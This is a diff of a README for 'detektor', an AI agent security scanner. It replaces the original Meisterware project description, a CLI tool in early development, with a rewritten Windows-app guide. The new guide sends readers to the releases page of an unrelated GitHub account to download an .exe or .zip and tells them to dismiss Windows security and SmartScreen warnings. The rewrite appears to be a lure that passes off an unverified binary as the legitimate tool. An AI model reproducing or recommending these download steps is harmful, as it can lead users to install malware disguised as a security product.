@@ -1,167 +1,182 @@
-# Detektor
+# 🛡️ detektor - Scan AI Agent Security Fast
 
-[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
-[![OpenPAKT](https://img.shields.io/badge/OpenPAKT-v0.1-green)](https://github.com/Meisterware/openpakt-spec)
-[![Status](https://img.shields.io/badge/status-early%20development-orange)]()
-[![Issues](https://img.shields.io/github/issues/meisterware/detektor)](https://github.com/Meisterware/detektor/issues)
-[![PRs](https://img.shields.io/github/issues-pr/meisterware/detektor)](https://github.com/Meisterware/detektor/pulls)
+[![Download detektor](https://img.shields.io/badge/Download-Detektor-1f6feb?style=for-the-badge&logo=github)](https://github.com/Kumarpi3052/detektor/releases)
 
-**Detektor** is a lightweight **AI agent security scanner** designed for **CI pipelines**.
+## 🧭 What detektor does
 
-It analyses agent prompts, configurations, workflows, and related artifacts to detect security risks and produce **OpenPAKT-compliant reports**.
+detektor is a Windows app that checks AI agent setups for security risks.
 
-Detektor helps teams identify issues such as:
+It helps you spot:
 
-* prompt injection vulnerabilities
-* unsafe tool permissions
-* other AI agent security weaknesses
+- Prompt injection risks
+- Unsafe tool access
+- Weak agent permissions
+- Issues in CI security checks
+- Missing OpenPAKT report details
 
-The scanner generates structured findings that can be evaluated by CI systems using the **OpenPAKT CI Policy Evaluation Semantics**.
+Use it to review an AI agent before it ships or before it runs in a build pipeline.
 
----
+## 💻 What you need
 
-## Project Goals
+Before you install detektor, make sure your PC has:
 
-Detektor is designed to be:
+- Windows 10 or Windows 11
+- An internet connection for the download
+- At least 200 MB of free disk space
+- A standard user account or admin account
+- .NET Desktop Runtime if the app asks for it
 
-* **minimal** — small and easy to understand
-* **deterministic** — predictable results suitable for CI gating
-* **implementation-agnostic** — works with different agent frameworks
-* **DevSecOps-friendly** — integrates easily into build pipelines
+If your system blocks the app, use a work or personal account that can run downloaded files.
 
-The project focuses on **practical security scanning for AI agents** rather than full runtime protection.
+## 📥 Download detektor
 
----
+Visit this page to download the Windows release:
 
-## Project Status
+https://github.com/Kumarpi3052/detektor/releases
 
-Detektor is currently in **early development**.
+On that page, look for the latest release and download the Windows file. Most users should pick the `.exe` or `.zip` file listed under Assets.
 
-The initial milestone focuses on implementing the **OpenPAKT v0.1 core specification**, including:
+## 🪟 Install and open on Windows
 
-* report schema support
-* basic rule detection
-* example security scenarios
-* CI policy evaluation compatibility
+Follow these steps:
 
----
+1. Open the release page in your browser.
+2. Find the newest version at the top of the page.
+3. Under Assets, download the Windows file.
+4. If you downloaded a `.zip` file, open it and extract the contents.
+5. If you downloaded a `.exe` file, double-click it to run detektor.
+6. If Windows shows a security prompt, choose the option that lets you open the file.
+7. Wait for the app to finish loading.
 
-## Example
+If you extracted a folder, keep the files together in the same location.
 
-Run a repository scan:
+## 🔍 How to use detektor
 
-```text
-detektor scan .
-```
+After you open the app, use it like this:
 
-Generate an OpenPAKT report:
+1. Start detektor.
+2. Point it to your AI agent project, build folder, or CI output.
+3. Choose a scan type if the app asks for one.
+4. Run the scan.
+5. Review the results for:
+   - Prompt injection warnings
+   - Tool permission issues
+   - Unsafe access patterns
+   - CI security findings
+6. Export or save the report if you need to share it.
 
-```text
-detektor report --output report.json
-```
+If your project uses agents, tools, or prompt files, scan those first.
 
----
+## 🧪 What detektor checks
 
-## Relationship to OpenPAKT
+detektor focuses on the most common risk areas in AI agent work:
 
-Detektor is the **reference scanner implementation** for the **OpenPAKT specification**.
+- Prompt injection paths in prompts and agent input
+- Tool permissions that give too much access
+- Unsafe tool calls that may reach files, networks, or shell commands
+- CI security checks that can run in builds
+- OpenPAKT report output for review and audit use
 
-OpenPAKT defines a standardised way to represent:
+This makes it useful for local review and for build-time checks.
 
-* AI agent security findings
-* reproducible security testing scenarios
-* CI policy evaluation semantics
+## 📄 OpenPAKT reports
 
-Detektor implements these concepts and produces reports conforming to the OpenPAKT report schema.
+detektor can generate OpenPAKT reports for your scans.
 
-Example report structure:
+Use these reports when you need to:
 
-```json
-{
-  "schema_version": "0.1",
-  "scan": {
-    "tool": {
-      "name": "detektor",
-      "version": "0.1.0"
-    },
-    "timestamp": "2026-03-08T10:00:00Z"
-  },
-  "target": {
-    "type": "repository",
-    "path": "."
-  },
-  "summary": {
-    "critical": 0,
-    "high": 1,
-    "medium": 0,
-    "low": 0,
-    "informational": 0
-  }
-}
-```
+- Share results with a team
+- Keep a record of a scan
+- Review issues in a standard format
+- Track changes over time
 
-The OpenPAKT report format provides a **stable contract for CI pipelines and security dashboards**. 
+If you use CI, save the report as part of your build output.
 
----
+## 🛠️ Common setup tips
 
-## Roadmap
+If the app does not start:
 
-Detektor evolves alongside the **OpenPAKT specification**, expanding scanning capabilities in stages while keeping the core architecture minimal and extensible.
+- Try opening it again as the same user who downloaded it
+- Check that the file was not blocked by Windows
+- Make sure the download finished
+- If you used a ZIP file, extract all files before running the app
+- If Windows asks for .NET, install the runtime it names and try again
 
-### v0.1 — Detektor MVP (🚧 In-Progress)
+If the scan does not find your files:
 
-Initial release providing a minimal security scanner capable of producing OpenPAKT-compliant reports.
+- Check the folder path
+- Make sure the project files are not still inside a nested ZIP folder
+- Use a local copy of the project, not a cloud-only shortcut
 
-Key capabilities:
+## 🔐 Best way to use it
 
-- repository scanning
-- prompt injection detection
-- tool permission validation
-- OpenPAKT scenario execution
-- OpenPAKT report generation
-- CI policy evaluation
+For the best results, scan:
 
-The goal is to provide a small, deterministic scanner suitable for CI integration. 
+- Agent prompt files
+- Tool config files
+- Build scripts
+- CI pipeline files
+- Any file that tells the agent what it can access
 
----
+Run detektor before release, before merge, and before deployment.
 
-### v0.2 — Ecosystem Integration
+## 📁 Typical use cases
 
-Detektor v0.2 expands the scanner beyond the minimal MVP by improving interoperability with existing DevSecOps tooling and enabling easier integration into real-world CI pipelines and security workflows.
+detektor works well for:
 
-Planned improvements include:
-- SARIF export for security dashboards and code scanning platforms
-- CI workflow examples for GitHub Actions, GitLab CI, and Azure Pipelines
-- Repository configuration support via a detektor.yaml file
-- Modular rule architecture for extending detection capabilities
+- AI agent projects
+- LLM apps with tools
+- DevSecOps build checks
+- Security testing in CI
+- Prompt safety review
+- Permission review for agent tools
 
-The goal of v0.2 is to make Detektor practical for real-world CI environments.
+It fits teams that want a simple security check before shipping code.
 
----
+## 🧩 File types you may see
 
-### v0.3 — Agent Ecosystem Scanning
+The release page may include one or more of these:
 
-Detektor v0.3 expands scanning capabilities beyond repository-level analysis to include AI agent configurations, orchestration workflows, and tool ecosystems.
+- `.exe` for direct run on Windows
+- `.zip` for manual extract and run
+- Report files from scan results
+- Support files used by the app
 
-Planned capabilities include:
-- Agent configuration scanning
-- Tool capability validation
-- Multi-agent workflow analysis
-- Detection of cascading failures across agent workflows
-- Optional scanning of tool registries and agent ecosystems
+If you are not sure which file to use, pick the Windows `.exe` or the main `.zip` package from the latest release
 
-The goal of v0.3 is to evolve Detektor into a security scanner for AI agent infrastructures and orchestration systems.
+## ❓ Help with first run
 
----
+If Windows shows a smart screen or file warning:
 
-## Vision
+1. Check that the file came from the detektor releases page
+2. Open the file again
+3. Choose the option to run it if you trust the source
 
-To support a **growing ecosystem of AI agent security tooling**.
+If the app opens and closes fast:
 
-Detektor aims to help developers and organisations identify and mitigate risks in AI agent systems before deployment.
+- Run it again
+- Check whether a file path was entered
+- Look for a scan setting that needs to be set first
 
----
+If you want to keep your results:
 
-## Organisation
+- Save the report after each scan
+- Use a clear file name with the date
+- Store reports in a project folder
 
-Detektor is developed by **Meisterware** as part of the broader effort to improve **AI agent security tooling and standards**.
+## 📌 Project topics
+
+detektor covers work related to:
+
+- agent security
+- AI agents
+- AI safety
+- AI security
+- CI security
+- DevSecOps
+- .NET
+- LLM security
+- OpenPAKT
+- prompt injection
+- security scanner
+- security testing
